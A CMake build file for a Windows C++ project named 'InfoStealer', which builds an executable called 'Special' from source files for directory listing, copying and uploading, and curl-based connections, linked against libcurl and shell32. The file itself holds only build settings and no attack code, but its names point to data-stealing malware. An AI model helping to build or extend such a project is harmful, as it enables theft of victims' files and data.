cmake_minimum_required(VERSION 3.10)
project(InfoStealer)

# Set C++ standard
set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# Specify Path to the vcpkg toolchain file
set(CMAKE_TOOLCHAIN_FILE "$ENV{VCPKG_PATH}/vcpkg/scripts/buildsystems/vcpkg.cmake" CACHE STRING "Vcpkg toolchain file")

set(SOURCES
    src/main.cpp
    src/get-directory.cpp
    src/copy-upload.cpp
    src/connection.cpp
    src/curl.cpp
)
add_executable(Special ${SOURCES})

# Find and link CURL
find_package(CURL REQUIRED)
target_link_libraries(Special PRIVATE CURL::libcurl)
target_link_libraries(Special PRIVATE shell32)
target_include_directories(Special PRIVATE ${CMAKE_CURRENT_SOURCE_DIR}/include)